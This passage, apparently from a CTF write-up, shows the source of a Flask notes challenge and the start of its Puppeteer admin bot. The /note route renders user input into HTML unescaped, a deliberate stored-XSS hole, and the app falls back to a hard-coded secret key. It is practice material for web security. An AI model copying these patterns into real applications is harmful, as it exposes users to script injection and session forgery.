&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;SECRET_KEY&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;tops3cr3t&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># session secret key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SESSION_COOKIE_SECURE&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SESSION_COOKIE_HTTPONLY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SESSION_COOKIE_SAMESITE&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Lax&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># samesite cookie lax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HOST&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;CHALL_HOST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;localhost:5000&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">redis&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Redis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># åç«¯redisæ•°æ®åº“&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">after_request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add_XFrame&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Frame-Options&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;DENY&amp;#34;&lt;/span> &lt;span style="color:#75715e"># è¯¥é¡µé¢ä¸å…è®¸è¢«ä»»ä½•é¡µé¢å¼•ç”¨ï¼Œä¹Ÿä¸å…è®¸å¼•ç”¨ä»»ä½•é¡µé¢&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">response&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/change_note&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># ä¿®æ”¹sessionä¸­çš„note&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;note&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modified&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Changed succesfully&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/do_report&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">do_report&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cur_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">time&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Forwarded-For&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&amp;#34;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strip&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># amazing google load balancer&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">last_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;time.&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># åˆ¤æ–­ä¸ŠæŠ¥æ—¶é—´é—´éš”&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">last_time&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">last_time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">last_time&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">time_diff&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur_time&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">last_time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">time_diff&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">rpush&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;submissions&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># å°†ä¸ŠæŠ¥urlå­˜å…¥redisæ•°æ®åº“ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">setex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;time.&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">ip&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cur_time&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;submitted&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;rate limited&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/note&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># noteå…¨éƒ¨å­˜sessionä¸­ åœ¨æœ¬åœ°&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">notes&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;note&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/report&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># ä¸ŠæŠ¥admin è½¬è‡³/do_report&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;title&amp;gt;Notes app&amp;lt;/title&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt;&amp;lt;a href=&amp;#34;/note&amp;#34;&amp;gt;Get Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/&amp;#34;&amp;gt;Change Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/report&amp;#34;&amp;gt;Report Link&amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;hr&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt;Please report suspicious URLs to admin&amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;form action=&amp;#34;/do_report&amp;#34; id=&amp;#34;reportform&amp;#34; method=POST&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> URL: &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;submit&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># é¦–é¡µ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;title&amp;gt;Notes app&amp;lt;/title&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt;&amp;lt;a href=&amp;#34;/note&amp;#34;&amp;gt;Get Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/&amp;#34;&amp;gt;Change Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/report&amp;#34;&amp;gt;Report Link&amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;hr&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt; Add a note &amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;form action=&amp;#34;/change_note&amp;#34; id=&amp;#34;noteform&amp;#34; method=POST&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;textarea rows=&amp;#34;10&amp;#34; cols=&amp;#34;100&amp;#34; name=&amp;#34;data&amp;#34; form=&amp;#34;noteform&amp;#34; placeholder=&amp;#34;Note&amp;#39;s content&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;submit&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸‹é¢æ˜¯bot.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">redis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">redis&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createClient&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">6379&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// replace with your port
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// replace with your hostanme or IP address
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;puppeteer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">browse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Browsing -&amp;gt; &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">launch&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">headless&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;--no-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;--disable-gpu&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})).&lt;/span>&lt;span style="color:#75af00">createIncognitoBrowserContext&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// æ— å¤´æ¨¡å¼
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">newPage&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setCookie&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CHALL_COOKIE&lt;/span>&lt;span style="color:#111">,&lt;/span>
